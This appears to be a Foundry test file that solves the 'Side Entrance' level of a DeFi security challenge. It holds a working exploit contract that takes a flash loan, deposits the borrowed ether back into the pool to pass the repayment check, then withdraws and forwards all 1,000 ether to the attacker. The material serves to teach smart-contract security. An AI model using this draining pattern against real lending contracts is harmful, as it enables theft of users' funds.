// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 public constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool public sideEntranceLenderPool;
    address payable public attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startBroadcast(attacker);
        
        AttackerContract AttackerContractInterface = new AttackerContract(sideEntranceLenderPool, address(attacker));
        AttackerContractInterface.attack();
        AttackerContractInterface.withdraw();




        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }
    

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract AttackerContract {
    

    SideEntrance SideEntranceInterface; 
    SideEntranceLenderPool pool ;
    
    address immutable attacker; 
    constructor (SideEntranceLenderPool _poolAddress, address _attacker) {
        pool = _poolAddress;
        attacker = _attacker;
    } 

   function attack() external {
    pool.flashLoan(1000 ether);
   } 

   function execute () external payable {
    pool.deposit{value : msg.value}();
   }

   function withdraw () external {
    pool.withdraw();
   }

   receive () external payable {
    (bool success, ) = attacker.call{value: 1000 ether}("");
    require(success, "transfert failed");
   }


}

// interface IPool {
//     function flashLoan(uint256 amount) external;
//     function deposit() external payable;
//     function withdraw() external;
// }

